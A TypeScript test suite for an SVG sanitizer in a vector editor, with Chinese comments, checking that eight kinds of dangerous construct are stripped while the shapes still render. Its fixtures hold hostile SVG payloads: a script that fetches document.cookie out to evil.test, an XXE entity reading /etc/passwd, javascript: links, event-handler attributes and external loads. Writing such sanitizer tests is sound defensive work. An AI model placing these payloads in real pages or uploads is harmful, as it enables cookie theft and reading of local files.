import assert from "node:assert/strict";
import test from "node:test";

import {
  SVG_SANITIZE_RULES,
  SVG_DANGEROUS_CONSTRUCT_CLASSES,
  assertSvgSanitized,
  residualDangerousConstructs,
  sanitizeSvg,
} from "../src/shell/vector-editor/vector-sanitize.ts";
import { VECTOR_CONSTANTS, VectorCarrierError } from "../src/shell/vector-editor/vector-schema.ts";

/**
 * 自证样例 1:把 §3.2 八条规则全部踩一遍的敌意 SVG。它同时带四个真实图形,
 * 所以「剥干净」与「仍渲得出」两件事必须在同一份输入上同时成立。
 */
const HOSTILE_SVG = `<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" onload="alert(1)">
  <title>hostile icon</title>
  <script>alert('pwned')</script>
  <style>@import url("https://evil.test/x.css"); .a { fill: #1F2328; }</style>
  <foreignObject width="10" height="10"><body xmlns="http://www.w3.org/1999/xhtml">hi</body></foreignObject>
  <a href="javascript:alert(2)"><rect x="2" y="2" width="8" height="8" fill="#1F2328"/></a>
  <image href="https://evil.test/tracker.png" x="0" y="0" width="4" height="4"/>
  <use href="https://evil.test/sprite.svg#icon"/>
  <path d="M3 3 L21 3 L21 21 L3 21 Z" stroke="#1F2328" fill="none" onclick="steal()"/>
  <circle cx="12" cy="12" r="5" stroke="#1F2328" fill="none"/>
</svg>`;

/**
 * 自证样例 2:一份干净的 24 栅格图标,四个独立图形、单一墨色。它是 §5.1 三件
 * 能力与 §8 完备判据的正面样例,走完 empty → … → ready。
 */
const CLEAN_ICON_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
  <title>folder open</title>
  <path d="M2 6 L9 6 L11 9 L22 9 L22 19 L2 19 Z" fill="none" stroke="#1F2328" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
  <path d="M4 12 L20 12" fill="none" stroke="#1F2328" stroke-width="2" stroke-linecap="round"/>
  <circle cx="17" cy="15" r="2" fill="none" stroke="#1F2328" stroke-width="2"/>
  <rect x="5" y="14" width="6" height="3" rx="1" fill="none" stroke="#1F2328" stroke-width="2"/>
</svg>`;

/**
 * 自证样例 3:233 B 级空壳。语法合法、净化后无残留,但没有可编辑的图形层级,
 * §8 必须判它不合格 —— 这是合同 §2.8 点名的那类产物。
 */
const HOLLOW_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0" fill="none"/><rect x="0" y="0" width="1" height="1" fill="none"/></svg>`;

// ---------------------------------------------------------------------------
// §3.2 净化规则逐条 —— 安全面
// ---------------------------------------------------------------------------

test("§3.2 八条规则在契约里逐条登记,C28 危险构造类目数与之一致", () => {
  assert.deepEqual(
    SVG_SANITIZE_RULES.map((rule) => rule.id),
    [
      "script-element",
      "event-attribute",
      "foreign-object",
      "external-href",
      "dangerous-scheme",
      "external-image",
      "style-import",
      "external-entity",
    ],
  );
  assert.equal(SVG_DANGEROUS_CONSTRUCT_CLASSES, 8);
  assert.equal(
    SVG_DANGEROUS_CONSTRUCT_CLASSES,
    VECTOR_CONSTANTS.C28_dangerousConstructClasses,
  );
  for (const rule of SVG_SANITIZE_RULES) {
    assert.match(rule.spec, /§3\.2/);
    assert.match(rule.disposition, /^MUST /);
  }
});

/**
 * 每条规则一个最小敌意样例。每例都额外带一个真图形,用来确认净化器剥的是危险
 * 构造而不是把整份 SVG 铲平。
 */
const RULE_CASES = [
  {
    rule: "script-element",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><script>fetch('https://evil.test?c='+document.cookie)</script><path d="M2 2 L20 20" stroke="#1F2328"/></svg>`,
    gone: ["<script", "document.cookie"],
  },
  {
    rule: "event-attribute",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" onload="alert(1)"><path d="M2 2 L20 20" stroke="#1F2328" onclick="alert(2)" onmouseover="alert(3)"/></svg>`,
    gone: ["onload", "onclick", "onmouseover"],
  },
  {
    rule: "foreign-object",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><foreignObject width="9" height="9"><body xmlns="http://www.w3.org/1999/xhtml"><iframe src="https://evil.test"></iframe></body></foreignObject><path d="M2 2 L20 20" stroke="#1F2328"/></svg>`,
    gone: ["foreignObject", "iframe"],
  },
  {
    rule: "external-href",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><use href="https://evil.test/sprite.svg#icon"/><path d="M2 2 L20 20" stroke="#1F2328"/></svg>`,
    gone: ["evil.test"],
  },
  {
    rule: "dangerous-scheme",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><a href="javascript:alert(1)"><path d="M2 2 L20 20" stroke="#1F2328"/></a></svg>`,
    gone: ["javascript:"],
  },
  {
    rule: "external-image",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><image href="https://evil.test/tracker.png" width="4" height="4"/><path d="M2 2 L20 20" stroke="#1F2328"/></svg>`,
    gone: ["evil.test", "<image"],
  },
  {
    rule: "style-import",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><style>@import url("https://evil.test/x.css"); .a { fill: #1F2328; }</style><path class="a" d="M2 2 L20 20" stroke="#1F2328"/></svg>`,
    gone: ["@import", "evil.test"],
  },
  {
    rule: "external-entity",
    svg: `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M2 2 L20 20" stroke="#1F2328"/></svg>`,
    gone: ["<!DOCTYPE", "ENTITY", "file:///etc/passwd"],
  },
];

// 正对照：逐条危险构造的用例是按这张表注册的，表一空就静默少一批而全量全绿
// （`_COMMON.md §7b⑫`）。判据见 `table-driven-registration-guard`。
test("清单本身：每条剥离规则都有对应的题材", () => {
  assert.equal(
    RULE_CASES.length,
    SVG_SANITIZE_RULES.length,
    `题材表 ${RULE_CASES.length} 条、规则表 ${SVG_SANITIZE_RULES.length} 条，对不上。` +
      "每条规则都必须有一条真 SVG 打上去，否则那条规则等于没验",
  );
});

for (const testCase of RULE_CASES) {
  test(`§3.2 ${testCase.rule}:剥离危险构造且不铲平图形`, () => {
    const report = sanitizeSvg(testCase.svg);
    assert.ok(
      report.removals.some((removal) => removal.rule === testCase.rule),
      `期望命中 ${testCase.rule},实际 ${JSON.stringify(report.removals.map((r) => r.rule))}`,
    );
    for (const needle of testCase.gone) {
      assert.equal(
        report.svg.includes(needle),
        false,
        `净化后仍残留 ${needle}`,
      );
    }
    assert.deepEqual(report.residual, []);
    // 「净化后必须仍可渲染」:不能净化成空白。
    assert.equal(report.renderable, true);
    assert.ok(report.graphicElementCount >= 1);
    assert.equal(report.hasViewBox, true);
    assert.ok(report.svg.includes("<path"));
  });
}

test("§3.2 八条规则在同一份敌意 SVG 上一次全中,残留为 0 且仍可渲染", () => {
  const report = sanitizeSvg(HOSTILE_SVG);
  const hit = new Set(report.removals.map((removal) => removal.rule));
  for (const rule of SVG_SANITIZE_RULES) {
    assert.ok(hit.has(rule.id), `${rule.id} 未被命中`);
  }
  assert.deepEqual(report.residual, []);
  assert.equal(report.renderable, true);
  // 四个真图形(rect / path / circle 及 <a> 内容)一个都不能丢。
  assert.ok(report.graphicElementCount >= 3);
  assert.ok(report.svg.includes('<rect x="2" y="2"'));
  assert.ok(report.svg.includes('<circle cx="12" cy="12"'));
  assert.ok(report.svg.includes('d="M3 3 L21 3 L21 21 L3 21 Z"'));
  // 样式表里那条无害规则要留着,被剥的只有 @import。
  assert.ok(report.svg.includes(".a { fill: #1F2328; }"));
  for (const needle of [
    "<script",
    "onload",
    "onclick",
    "javascript:",
    "foreignObject",
    "evil.test",
    "@import",
    "<!DOCTYPE",
  ]) {
    assert.equal(report.svg.includes(needle), false, `残留 ${needle}`);
  }
});

test("§3.2 净化是纯函数:同输入同输出、幂等、不改动入参", () => {
  const input = String(HOSTILE_SVG);
  const first = sanitizeSvg(input);
  const second = sanitizeSvg(input);
  assert.equal(first.svg, second.svg, "同输入必须逐字节同输出");
  assert.deepEqual(
    first.removals.map((removal) => `${removal.rule}|${removal.target}`),
    second.removals.map((removal) => `${removal.rule}|${removal.target}`),
  );
  assert.equal(input, HOSTILE_SVG, "入参字符串不得被改写");

  const third = sanitizeSvg(first.svg);
  assert.equal(third.svg, first.svg, "二次净化必须是恒等");
  assert.deepEqual(third.removals, [], "干净输入不应再产生移除项");
});

test("§3.2 内部引用与无害内容不被误杀", () => {
  const internal = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><defs><symbol id="dot"><circle cx="2" cy="2" r="2"/></symbol></defs><use href="#dot"/><path d="M2 2 L20 20" stroke="#1F2328"/></svg>`;
  const report = sanitizeSvg(internal);
  assert.deepEqual(report.removals, []);
  assert.ok(report.svg.includes('href="#dot"'));
  assert.ok(report.svg.includes("<symbol"));
  assert.equal(report.renderable, true);
});

test("§3.2 残留探测走解析器,不被大小写与标签边界糊弄;干净文本不误报", () => {
  assert.deepEqual(residualDangerousConstructs(sanitizeSvg(HOSTILE_SVG).svg), []);
  assert.deepEqual(residualDangerousConstructs(CLEAN_ICON_SVG), []);

  const mixedCase = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><ScRiPt>alert(1)</ScRiPt><path d="M2 2 L20 20" OnClick="alert(2)"/></svg>`;
  const residual = residualDangerousConstructs(mixedCase);
  assert.ok(residual.includes("script-element"));
  assert.ok(residual.includes("event-attribute"));

  // 文本节点里写着 "script" 只是内容,不构成危险构造。
  const textOnly = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><text x="1" y="9">script onclick javascript</text><path d="M2 2 L20 20" stroke="#1F2328"/></svg>`;
  assert.deepEqual(residualDangerousConstructs(textOnly), []);
});

test("§3.2 assertSvgSanitized 对未净化文本抛错,对净化产物放行", () => {
  assert.throws(() => assertSvgSanitized(HOSTILE_SVG), VectorCarrierError);
  assert.doesNotThrow(() => assertSvgSanitized(sanitizeSvg(HOSTILE_SVG).svg));
});

test("§5.2 净化对已净化输入是幂等的(逐字节不动)", () => {
  for (const svg of [CLEAN_ICON_SVG, HOSTILE_SVG, HOLLOW_SVG]) {
    const once = sanitizeSvg(svg).svg;
    const twice = sanitizeSvg(once).svg;
    assert.equal(twice, once, "第二遍净化改了字节");
    assert.equal(sanitizeSvg(twice).svg, once, "第三遍净化仍须停在不动点");
    assert.deepEqual(sanitizeSvg(once).removals, []);
  }
});
